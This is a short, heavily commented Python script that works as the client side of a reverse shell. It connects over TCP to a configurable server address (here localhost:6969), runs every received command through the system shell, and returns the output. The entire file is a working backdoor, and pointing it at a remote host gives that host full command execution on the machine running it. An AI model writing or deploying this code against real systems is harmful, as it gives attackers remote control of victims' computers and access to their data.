import socket # Imports socket module
import subprocess # Imports subprocess module

hostAddress = "localhost" # IP Address of machine that runs server
portNumber = 6969 # Specifies the port used for communication

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates a TCP and IPV4 socket
    sock.connect((hostAddress, portNumber)) # Connect to the server socket
    while True: # Runs a loop until break statement is triggered
        receiveCommand = sock.recv(1024).decode().strip()
        if not receiveCommand: # Checks to see if the receiveCommand is nothing
            break # Breaks the loop
        commandOutput = subprocess.check_output(receiveCommand, shell = True) # Takes the received command and executes it in the terminal
        sock.sendall(commandOutput) # Sends the output of the command to the socket connection
except Exception as error:
    print(f"Error Message: {error}") # Prints error message
finally:
    sock.close() # Closes the client socket